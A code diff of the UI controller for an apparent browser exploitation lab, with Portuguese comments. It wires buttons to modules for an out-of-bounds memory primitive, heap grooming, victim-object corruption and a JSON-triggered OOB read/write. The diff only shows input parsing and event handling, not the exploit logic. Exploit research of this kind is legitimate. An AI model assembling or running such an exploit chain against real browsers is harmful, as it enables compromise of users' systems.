@@ -6,22 +6,34 @@ import * as Groomer from './heap_groomer.mjs';
 import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
 import * as JsonExploitTest from './json_exploit_test.mjs';
-import * as VictimFinder from './victim_finder.mjs'; // Importa VictimFinder
+import * as VictimFinder from './victim_finder.mjs';
 import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
 
 let uiInitialized = false;
 
 // Helper para parsear input que pode ser decimal ou hex
 function parseMaybeHex(valueStr, defaultValue = 0) {
-    if (typeof valueStr !== 'string' || valueStr.trim() === "") return defaultValue;
+    if (typeof valueStr !== 'string' || valueStr.trim() === "") {
+        if (typeof defaultValue === 'function') return defaultValue();
+        return defaultValue;
+    }
     const str = valueStr.trim().toLowerCase();
     try {
+        let parsedValue;
         if (str.startsWith("0x")) {
-            return parseInt(str, 16);
+            parsedValue = parseInt(str, 16);
+        } else {
+            parsedValue = parseInt(str, 10);
         }
-        return parseInt(str, 10);
+        if (isNaN(parsedValue)) {
+            appLog(`Valor '${valueStr}' resultou em NaN após parse. Usando default.`, "warn", "App.ParseHelper");
+            if (typeof defaultValue === 'function') return defaultValue();
+            return defaultValue;
+        }
+        return parsedValue;
     } catch (e) {
-        appLog(`Erro ao parsear valor '${valueStr}'. Usando default ${defaultValue}. Erro: ${e.message}`, "warn", "App.ParseHelper");
+        appLog(`Erro ao parsear valor '${valueStr}'. Usando default. Erro: ${e.message}`, "warn", "App.ParseHelper");
+        if (typeof defaultValue === 'function') return defaultValue();
         return defaultValue;
     }
 }
@@ -37,13 +49,17 @@ const App = {
         document.getElementById('btnTestCore')?.addEventListener('click', () => Core.testModule(appLog));
 
         // Passo 0
-        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
+        document.getElementById('btnTriggerOOB')?.addEventListener('click', async () => {
+            updateGlobalOOBConfig(); // Garante que configs OOB são lidas antes de ativar
+            await Core.triggerOOB_primitive();
+        });
 
         // Passos 1 & 2 (Grooming & Corruptor)
         document.getElementById('btnPrepareVictim')?.addEventListener('click', () => {
             const sizeStr = document.getElementById('victim_object_size_groom').value;
-            Groomer.prepareVictim(sizeStr); // prepareVictim agora espera string
+            Groomer.prepareVictim(sizeStr);
         });
+        // Listener CORRETO para o botão de Grooming Experimental
         document.getElementById('btnRunGroomingExperimental')?.addEventListener('click', Groomer.groomHeapButtonHandler);
 
         document.getElementById('btnFindAndCorrupt')?.addEventListener('click', async () => {
@@ -54,11 +70,13 @@ const App = {
             App.isCurrentlyRunningIterativeSearch = true;
             const btn = document.getElementById('btnFindAndCorrupt');
             if(btn) btn.disabled = true;
+            updateGlobalOOBConfig(); // Garante configs OOB antes da busca
 
             const gapStartStr = document.getElementById('gap_start_input').value;
             const gapEndStr = document.getElementById('gap_end_input').value;
             const gapStepStr = document.getElementById('gap_step_input').value;
-            const victimSizeStr = document.getElementById('victim_object_size_groom').value;
+            const victimSizeStr = document.getElementById('victim_object_size_groom').value; // Usado para preparar vítima se necessário
+            
             await Corruptor.findAndCorruptVictimFields_Iterative(gapStartStr, gapEndStr, gapStepStr, victimSizeStr);
 
             if(btn) btn.disabled = false;
@@ -91,14 +109,16 @@ const App = {
 
         // Passo 6 (JSON OOB Trigger)
         document.getElementById('btnRunJsonOOBExploit')?.addEventListener('click', () => {
+            updateGlobalOOBConfig(); // Garante configs OOB
             const targetType = document.getElementById('jsonOobTargetObject').value;
             const relativeOffset = parseMaybeHex(document.getElementById('jsonOobRelativeOffset').value, 0);
-            const valueHex = document.getElementById('jsonOobValueToWriteHex').value; // Passa como string, json_exploit_test fará o parse
-            const bytesToRead = parseInt(document.getElementById('jsonOobBytesToRead').value, 10);
-            // Atualiza os inputs com os valores parseados (ou default) para consistência na UI
-            document.getElementById('jsonOobRelativeOffset').value = toHexS1(relativeOffset);
+            const valueHexStr = document.getElementById('jsonOobValueToWriteHex').value;
+            const bytesToRead = parseMaybeHex(document.getElementById('jsonOobBytesToRead').value, 4);
+            
+            document.getElementById('jsonOobRelativeOffset').value = toHexS1(relativeOffset); // Atualiza UI com valor parseado
+            document.getElementById('jsonOobBytesToRead').value = bytesToRead;
 
-            JsonExploitTest.jsonTriggeredOOBInteraction(targetType, relativeOffset, valueHex, bytesToRead);
+            JsonExploitTest.jsonTriggeredOOBInteraction(targetType, relativeOffset, valueHexStr, bytesToRead);
         });
         
         // Log
@@ -119,17 +139,14 @@ const App = {
             appLog("App.initialize: UI já inicializada. Ignorando.", "warn", "App.Init");
             return;
         }
-        // Lê valores iniciais da UI para OOB_CONFIG ao carregar.
-        // Isso garante que os valores no HTML sejam os iniciais usados.
         updateGlobalOOBConfig();
         
         App.setupUIEventListeners();
-        App.exploitSuccessfulThisSession = false; // Reset de estado
+        App.exploitSuccessfulThisSession = false;
         App.isCurrentlyRunningIterativeSearch = false;
         
         appLog("Laboratório Modular (v3.1.0 - Correções e Refinamentos) pronto.", "good", "App.Init");
         
-        // Limpar campos de GAP ao iniciar
         const addrofGapEl = document.getElementById('addrofGap');
         if (addrofGapEl) addrofGapEl.value = ""; 
         const gapToTestInputEl = document.getElementById('gap_to_test_input');
@@ -139,11 +156,10 @@ const App = {
     }
 };
 
-// Garante que o DOM está carregado antes de inicializar
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', App.initialize);
 } else {
-    App.initialize(); // DOM já carregado
+    App.initialize();
 }
 
 appLog("app.mjs carregado e pronto.", "info", "Global");
